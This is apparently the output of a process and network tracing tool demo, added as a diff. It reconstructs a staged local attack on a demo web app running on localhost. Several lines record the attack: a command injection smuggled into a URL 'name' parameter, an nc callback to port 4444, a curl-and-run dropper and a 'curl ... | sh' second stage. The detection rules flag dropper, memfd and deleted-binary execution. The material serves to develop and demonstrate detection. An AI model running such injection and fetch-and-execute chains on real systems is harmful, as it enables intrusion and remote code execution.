@@ -1,0 +1,220 @@
+14:07:08.248 p15d: start (30 s, network capture on)
+14:07:12.774 1. listener on 4444: nc pid 1959
+14:07:12.781 2. web app on 8080: pid 1963
+14:07:12.833 2b. stager on 8000: pid 1970 (serves k, a copy of id, and s2)
+14:07:14.125 3. curl /: done
+14:07:15.116 3. curl /about: done
+14:07:15.646 3. curl /lookup?name=localhost: done
+14:07:17.597 4. injected request sent: the app's shell ran nc to 4444, then the dropper and stage 2 from 8000
+14:07:18.851 5. scan of port 4441: refused, as expected
+14:07:18.865 5. scan of port 4442: refused, as expected
+14:07:18.880 5. scan of port 4443: refused, as expected
+14:07:19.964 p15d: waiting for the end of its 30 s
+14:07:44.238 p15d: exit 0
+
+p15-trace: port 4444
+run 20261114T140712Z-ed289b2d on p15-dev, kernel 7.0.0-38-generic, captured from 14:07:12.592 UTC
+
+Trust
+  capture RUNNING, accounting invariant closed, exit 0 (stop requested)
+  kernel-skipped events: none (every hook ran for every event)
+  process tree check (ADR-0023): complete: every process alive at the end is explained, and every one gone has its exit (0 fork(s) and 0 exit(s) unexplained; counted losses: fork 0, exit 0)
+  NET records: 29 captured, 0 lost to a full ring, 0 excluded by policy (failed accepts, non-IP sockets)
+
+Summary: 1 listener(s); 1 connection(s) accepted, 1 of them from a process on this host; 1 connect(s) to the port, 0 refused or failed
+
+Listeners on port 4444
+  127.0.0.1:4444 tcp  cookie 130  listening from 14:07:12.773 (t+0.180s)  by nc (1959) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+
+Connections accepted on port 4444
+  14:07:16.196 (t+3.603s)  127.0.0.1:49124 -> 127.0.0.1:4444  accepted by nc (pid 1959)  (listener cookie 130)
+      client: nc (1997) ← sh (1995) ← python (1963) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]  (exact, by TCP sequence number; connect at t+3.603s)
+
+Connects to port 4444
+  14:07:16.195 (t+3.603s)  127.0.0.1:49124 -> 127.0.0.1:4444 tcp  in progress (non-blocking)  by nc (1997) ← sh (1995) ← python (1963) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+
+Processes involved (13, with their ancestors)
+  pid 1959    nc -l 127.0.0.1 4444
+            started t+0.173s; exited 0 at t+4.882s
+            parent: bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1885    bash tools/demo/run_demo.sh /var/tmp/p15-demo
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1884    sudo env P15_PYTHON=/home/ashu/p15venv/bin/python P15D_FLAGS=--flow tools/demo/run_demo.sh /var/tmp/p15-demo
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            unusual: runs as a different user (uid 1000 -> euid 0)
+            parent: sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1882    sudo env P15_PYTHON=/home/ashu/p15venv/bin/python P15D_FLAGS=--flow tools/demo/run_demo.sh /var/tmp/p15-demo
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            unusual: runs as a different user (uid 1000 -> euid 0)
+            parent: bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1512    bash /home/ashu/fd-vm-test3/vm_test.sh flood disk costs canary demo pack
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1323    -bash
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1322    sshd-session: ashu@pts/0                
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1217    sshd-session: ashu [priv]               
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: sshd (1214) ← systemd (1) [started before the capture]
+  pid 1214    sshd: /usr/sbin/ss
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: systemd (1) [started before the capture]
+  pid 1       /usr/lib/systemd/systemd --switched-root --system --deserialize=51
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+  pid 1997    nc -w1 127.0.0.1 4444
+            started t+3.598s; exited 0 at t+4.871s
+            parent: sh (1995) ← python (1963) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1995    /bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh
+            started t+3.594s; exited 0 at t+4.997s
+            parent: python (1963) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1963    /home/ashu/p15venv/bin/python tools/demo/webapp.py 8080
+            started t+0.183s; killed by signal 15 at t+7.358s
+            parent: bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+
+Code provenance (ADR-0025)
+  pid 1882    sudo env P15_PYTHON=/home/ashu/p15venv/bin/python P15D_FLAGS=--flow tools/demo/run_demo.sh /var/tmp/p15-demo: runs as a different user (uid 1000 -> euid 0)
+  pid 1884    sudo env P15_PYTHON=/home/ashu/p15venv/bin/python P15D_FLAGS=--flow tools/demo/run_demo.sh /var/tmp/p15-demo: runs as a different user (uid 1000 -> euid 0)
+  pid 1961    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1965    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1969    cat: stdin is a pipe (fed by another process)
+  pid 1972    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1978    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1983    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1990    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2001    /tmp/.k: runs from a RAM filesystem
+  pid 2003    sh: stdin is a pipe (fed by another process)
+  pid 2005    python3 -: stdin is a pipe (fed by another process)
+  pid 2006    kworker: runs from memory (no file on disk); executable is writable by its runner; stdin is a pipe (fed by another process)
+  pid 2007    upd: runs a deleted binary; stdin is a pipe (fed by another process)
+  pid 2009    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2015    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2020    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2025    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2030    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pipe: curl (pid 2002) -> dash (pid 2003) [same pipe inode 18847]
+
+How the joins were made
+  listener <- accept: by socket cookie (exact, ADR-0004 rule 5)
+  client -> accept: 1 exact, by the TCP client sequence number (ADR-0022); 0 inferred from endpoints on this host (0 of them with more than one candidate, the connect nearest in time taken, within 5 s either side); 0 whose connect returned after the accept; 0 same-endpoint connect(s) set aside as a different connection; 0 not found; 0 TCP record(s) without a sequence number
+  process tree: 221 processes, 143 started before the capture (142 with parent and program from the opening snapshot, 1 not in it), 0 with a missing FORK; ADR-0009 checks: 0 double exits, 0 double forks (must be 0)
+HTML report: /var/tmp/p15-demo/port-4444.html
+
+rules: R1 dropper 3, R2 memfd-exec 1, R3 deleted-exec 1, R4 net-shell 2
+  +   3.080s  R4 net-shell    p:1987:327792908132  pid 1963 python (network input from 127.0.0.1:8080 <- 127.0.0.1:46746) started /bin/sh as pid 1987
+  +   3.635s  R4 net-shell    p:1995:328347635668  pid 1963 python (network input from 127.0.0.1:8080 <- 127.0.0.1:46756) started /bin/sh as pid 1995
+  +   4.969s  R1 dropper      p:2001:329682480917  wrote /tmp/.k (pid 1998 curl), ran it as pid 2001
+  +   5.017s  R1 dropper      p:2006:329727886470  wrote /memfd:kworker (deleted) (pid 2005 python3), ran it as pid 2006
+  +   5.017s  R2 memfd-exec   p:2006:329727886470  pid 2006 ran /proc/self/fd/3 as kworker
+  +   5.026s  R1 dropper      p:2007:329739199188  wrote /var/tmp/.upd-p15demo (pid 2005 python3), ran it as pid 2007
+  +   5.026s  R3 deleted-exec p:2007:329739199188  pid 2007 ran /proc/self/fd/4 as upd
+
+attack path around proc 1995 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)
+  41 nodes shown of 210 reached: 0 files only read on the way (libraries, configuration) and 169 earlier influences off the cause chain left out
+  started under: sudo(1884) <- sudo(1882) <- bash(1512) <- bash(1323) <- sshd-session(1322) <- sshd-session(1217) <- sshd(1214) <- systemd(1)
+
+alerts on this path:
+    +0.000s  R4 net-shell    pid 1963 python (network input from 127.0.0.1:8080 <- 127.0.0.1:46756) started /bin/sh as pid 1995
+    +1.335s  R1 dropper      wrote /tmp/.k (pid 1998 curl), ran it as pid 2001
+    +1.383s  R1 dropper      wrote /memfd:kworker (deleted) (pid 2005 python3), ran it as pid 2006
+    +1.383s  R2 memfd-exec   pid 2006 ran /proc/self/fd/3 as kworker
+    +1.392s  R1 dropper      wrote /var/tmp/.upd-p15demo (pid 2005 python3), ran it as pid 2007
+    +1.392s  R3 deleted-exec pid 2007 ran /proc/self/fd/4 as upd
+
+why it happened: the most recent cause of each step, newest first:
+             proc 1995 sh
+    +0.000s    <-CLONE-- proc 1963 python
+    -0.000s    <-RECV-- sock 127.0.0.1:8080 -> 127.0.0.1:46756
+               <-TCP-- sock 127.0.0.1:46756 -> 127.0.0.1:8080
+    -0.000s    <-SEND-- proc 1994 curl
+    -0.006s    <-CLONE-- proc 1885 bash
+    -0.027s    <-READ-- file (pipe) o:2549
+
+what it led to, in order (time from the start node's first moment):
+    +0.000s  proc 1963 python  --CLONE-->  proc 1995 sh
+    +0.000s  file /usr/bin/dash  --EXECUTE-->  proc 1995 sh  (as /bin/sh)
+    +0.002s  proc 1995 sh  --CLONE-->  proc 1996 getent
+    +0.002s  file /usr/bin/getent  --EXECUTE-->  proc 1996 getent
+    +0.004s  proc 1996 getent  --CONNECT-->  sock 127.0.0.1:36093 -> 127.0.0.53:53
+    +0.004s  proc 1996 getent  --SEND-->  sock 127.0.0.1:36093 -> 127.0.0.53:53  38 bytes
+    +0.004s  sock 127.0.0.1:36093 -> 127.0.0.53:53  --RECV-->  proc 1996 getent  66 bytes
+    +0.004s  proc 1996 getent  --WRITE-->  file (pipe) o:2613  26 bytes
+    +0.005s  file (pipe) o:2613  --READ-->  proc 1963 python  26 bytes
+    +0.005s  proc 1995 sh  --CLONE-->  proc 1997 nc
+    +0.005s  file /usr/bin/nc.openbsd  --EXECUTE-->  proc 1997 nc  (as /usr/bin/nc)
+    +0.010s  proc 1997 nc  --CONNECT-->  sock 127.0.0.1:49124 -> 127.0.0.1:4444
+    +0.010s  sock 127.0.0.1:4444 -> 127.0.0.1:49124  --ACCEPT-->  proc 1959 nc
+    +1.291s  proc 1995 sh  --CLONE-->  proc 1998 curl
+    +1.291s  file /usr/bin/curl  --EXECUTE-->  proc 1998 curl
+    +1.300s  proc 1998 curl  --CONNECT-->  sock 127.0.0.1:57018 -> 127.0.0.1:8000
+    +1.300s  proc 1998 curl  --SEND-->  sock 127.0.0.1:57018 -> 127.0.0.1:8000  79 bytes
+    +1.301s  sock 127.0.0.1:8000 -> 127.0.0.1:57018  --ACCEPT-->  proc 1970 python
+    +1.302s  sock 127.0.0.1:8000 -> 127.0.0.1:57018  --RECV-->  proc 1970 python  79 bytes
+    +1.317s  proc 1970 python  --WRITE-->  file /var/tmp/p15-demo/stager.log  x2  123 bytes
+    +1.317s  proc 1970 python  --SEND-->  sock 127.0.0.1:8000 -> 127.0.0.1:57018  x47  11807310 bytes
+    +1.317s  sock 127.0.0.1:57018 -> 127.0.0.1:8000  --RECV-->  proc 1998 curl  x119  11807310 bytes
+    +1.317s  file /tmp/.k  --OPEN-->  proc 1998 curl
+    +1.317s  proc 1998 curl  --WRITE-->  file /tmp/.k  x1497  11807104 bytes
+    +1.329s  proc 1995 sh  --CLONE-->  proc 2000 chmod
+    +1.330s  file /usr/lib/cargo/bin/coreutils/tee  --EXECUTE-->  proc 2000 chmod  (as /usr/bin/chmod)
+    +1.335s  proc 1995 sh  --CLONE-->  proc 2001 .k
+    +1.335s  file /tmp/.k  --EXECUTE-->  proc 2001 .k
+    +1.338s  proc 2001 .k  --WRITE-->  file (pipe) o:2706  x3  32 bytes
+    +1.339s  file (pipe) o:2706  --READ-->  proc 1963 python  x3  249 bytes
+    +1.339s  proc 1995 sh  --CLONE-->  proc 2002 curl
+    +1.339s  proc 1995 sh  --CLONE-->  proc 2003 sh
+    +1.340s  file /usr/bin/curl  --EXECUTE-->  proc 2002 curl
+    +1.340s  file /usr/bin/dash  --EXECUTE-->  proc 2003 sh  (as /usr/bin/sh)
+    +1.342s  file (pipe) o:2758  --READ-->  proc 2003 sh  563 bytes
+    +1.346s  proc 2002 curl  --CONNECT-->  sock 127.0.0.1:57024 -> 127.0.0.1:8000
+    +1.346s  proc 2002 curl  --SEND-->  sock 127.0.0.1:57024 -> 127.0.0.1:8000  80 bytes
+    +1.346s  sock 127.0.0.1:8000 -> 127.0.0.1:57024  --ACCEPT-->  proc 1970 python
+    +1.346s  sock 127.0.0.1:8000 -> 127.0.0.1:57024  --RECV-->  proc 1970 python  80 bytes
+    +1.347s  proc 1970 python  --SEND-->  sock 127.0.0.1:8000 -> 127.0.0.1:57024  x2  764 bytes
+    +1.347s  sock 127.0.0.1:57024 -> 127.0.0.1:8000  --RECV-->  proc 2002 curl  764 bytes
+    +1.347s  proc 2002 curl  --WRITE-->  file (pipe) o:2758  563 bytes
+    +1.348s  proc 2003 sh  --WRITE-->  file (pipe) o:2761  477 bytes
+    +1.348s  proc 2003 sh  --CLONE-->  proc 2005 python3
+    +1.348s  file /usr/bin/python3.14  --EXECUTE-->  proc 2005 python3  (as /usr/bin/python3)
+    +1.361s  file (pipe) o:2761  --READ-->  proc 2005 python3  477 bytes
+    +1.371s  file /usr/lib/cargo/bin/coreutils/tee  --OPEN-->  proc 2005 python3  x2
+    +1.371s  file /usr/lib/cargo/bin/coreutils/tee  --READ-->  proc 2005 python3  11807104 bytes
+    +1.376s  proc 2005 python3  --WRITE-->  file /memfd:kworker (deleted)  11807104 bytes
+    +1.380s  proc 2005 python3  --CLONE-->  proc 2006 3 [kworker]
+    +1.383s  file /memfd:kworker (deleted)  --EXECUTE-->  proc 2006 3 [kworker]
+    +1.387s  proc 2006 3 [kworker]  --WRITE-->  file (pipe) o:2706  x5  107 bytes
+    +1.388s  file /var/tmp/.upd-p15demo  --OPEN-->  proc 2005 python3  x2
+    +1.392s  proc 2005 python3  --CLONE-->  proc 2007 4 [upd]
+    +1.392s  file /var/tmp/.upd-p15demo  --EXECUTE-->  proc 2007 4 [upd]
+    +1.395s  proc 2007 4 [upd]  --WRITE-->  file (pipe) o:2706  x5  110 bytes
+    +1.404s  proc 1963 python  --WRITE-->  file /var/tmp/p15-demo/webapp.log  265 bytes
+    +1.404s  proc 1963 python  --SEND-->  sock 127.0.0.1:8080 -> 127.0.0.1:46756  x2  144 bytes
+    +1.404s  sock 127.0.0.1:46756 -> 127.0.0.1:8080  --RECV-->  proc 1994 curl  144 bytes
+             sock 127.0.0.1:46756 -> 127.0.0.1:8080  ==TCP==  sock 127.0.0.1:8080 -> 127.0.0.1:46756  (one connection, joined by sequence number)
+             sock 127.0.0.1:49124 -> 127.0.0.1:4444  ==TCP==  sock 127.0.0.1:4444 -> 127.0.0.1:49124  (one connection, joined by sequence number)
+             sock 127.0.0.1:57018 -> 127.0.0.1:8000  ==TCP==  sock 127.0.0.1:8000 -> 127.0.0.1:57018  (one connection, joined by sequence number)
+             sock 127.0.0.1:57024 -> 127.0.0.1:8000  ==TCP==  sock 127.0.0.1:8000 -> 127.0.0.1:57024  (one connection, joined by sequence number)
+
+the processes, in full:
+  proc 1885 bash (bash tools/demo/run_demo.sh /var/tmp/p15-demo)
+  proc 1959 nc (nc -l 127.0.0.1 4444)
+  proc 1963 python (/home/ashu/p15venv/bin/python tools/demo/webapp.py 8080)
+  proc 1970 python (/home/ashu/p15venv/bin/python -m http.server 8000 --bind 127.0.0.1 --directory /var/tmp/p15-demo/stager)
+  proc 1994 curl (curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh)
+  proc 1995 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)
+  proc 1996 getent (getent hosts localhost)
+  proc 1997 nc (nc -w1 127.0.0.1 4444)
+  proc 1998 curl (curl -s http://127.0.0.1:8000/k -o /tmp/.k)
+  proc 2000 chmod (chmod +x /tmp/.k)
+  proc 2001 .k (/tmp/.k)
+  proc 2002 curl (curl -s http://127.0.0.1:8000/s2)
+  proc 2003 sh (sh)
+  proc 2005 python3 (python3 -)
+  proc 2006 3 (kworker)
+  proc 2007 4 (upd)
+
+HTML: /var/tmp/p15-demo/attack-path.html
+run_demo: p15d exit 0, p15w-inspect exit 0, reports made, graph made; files in /var/tmp/p15-demo
